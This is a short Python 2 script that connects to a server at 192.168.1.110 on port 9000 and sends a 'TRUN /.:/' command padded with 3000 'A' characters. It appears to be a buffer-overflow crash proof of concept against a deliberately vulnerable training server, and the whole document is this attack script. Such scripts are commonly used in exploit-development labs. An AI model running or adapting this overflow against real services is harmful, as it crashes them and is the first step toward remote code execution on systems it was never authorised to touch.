import sys, socket

buff = "TRUN /.:/"

buff += "A" * 3000

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.1.110',9000))

print s.recv(1024)

s.send(buff)

s.close()
